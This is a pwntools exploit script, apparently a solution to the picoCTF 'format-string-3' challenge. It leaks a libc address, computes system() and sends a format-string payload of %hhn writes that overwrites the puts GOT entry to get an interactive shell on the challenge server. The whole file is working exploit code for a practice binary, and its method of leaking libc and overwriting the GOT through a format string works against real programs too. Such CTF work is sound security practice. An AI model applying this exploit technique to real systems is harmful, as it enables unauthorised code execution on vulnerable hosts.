#!/usr/bin/env python3

from pwn import *

context.binary = "./format-string-3"

if args.DEBUG:
    context.log_level = 'DEBUG'

if args.REMOTE:
    p = remote("rhea.picoctf.net",57042)
else:
    p = process()

context.gdb_binary = "pwndbg"
if args.TMUX:
    context.terminal = ['tmux', 'split-pane', '-h']
if args.GDB and not args.REMOTE:
    gdb.attach(p)

p.recvuntil(b"libc: ")
setvbuf_addr = int(p.recvline().strip(), 16)

puts_got_plt = 0x0404018
libc_base = setvbuf_addr - 0x543f0
system_addr = libc_base + 0x29760

log.info(f"setvbuf:   {hex(setvbuf_addr)}")
log.info(f"system:    {hex(system_addr)}")
log.info(f"libc_base: {hex(libc_base)}")

sys_las3byte = hex(system_addr)[-6:]
pairs = [int(sys_las3byte[i:i+2], 16) for i in range(0, len(sys_las3byte), 2)]
values = [2, 1, 0]

result = dict(zip(pairs, values))
result = dict(sorted(result.items()))
log.info(f"result: {result}")


cursor_fmt = 38
fmt_begin = 44
fmt_payload = b""
total_wrt = 0
for key, val in result.items():
    need_to_write = key - total_wrt
    fmt_payload += b"%" + str(need_to_write).encode() + b"c%" + str(fmt_begin+val).encode() + b"$hhn"
    total_wrt = key

log.info(f"fmt_payload: {fmt_payload}")

fmt_padding = b"A"*((fmt_begin-cursor_fmt)*8-len(fmt_payload))

payload = fmt_payload + fmt_padding +  p64(puts_got_plt) + p64(puts_got_plt + 1) + p64(puts_got_plt + 2)
p.sendline(payload)

p.interactive()
